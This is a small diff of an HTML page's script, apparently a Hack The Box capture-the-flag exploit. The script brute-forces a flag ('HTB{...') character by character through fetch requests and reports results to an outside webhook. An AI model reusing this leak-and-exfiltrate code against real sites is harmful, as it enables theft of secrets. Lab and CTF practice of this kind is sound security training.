@@ -14,7 +14,7 @@
     async function makeFetchRequest() {
 
         for(var i=0; i<letters.length; i++){
-            await doGuess(htb + letters[i]);
+            await doGuess(letters[i]);//await doGuess(htb + letters[i]);
         }
     }
 
@@ -29,11 +29,11 @@
         })
         .catch(error => {fetch(whook+g+'failed')})
     }
-        //makeFetchRequest();
-    doGuess('H');
-    doGuess('HT');
-    doGuess('HTB');
-    doGuess('HTB{');
-    console.log("newest");
+    makeFetchRequest();
+    //doGuess('H');
+   // doGuess('HT');
+   // doGuess('HTB');
+  //  doGuess('HTB{');
+   // console.log("newest");
     </script>
 </body>
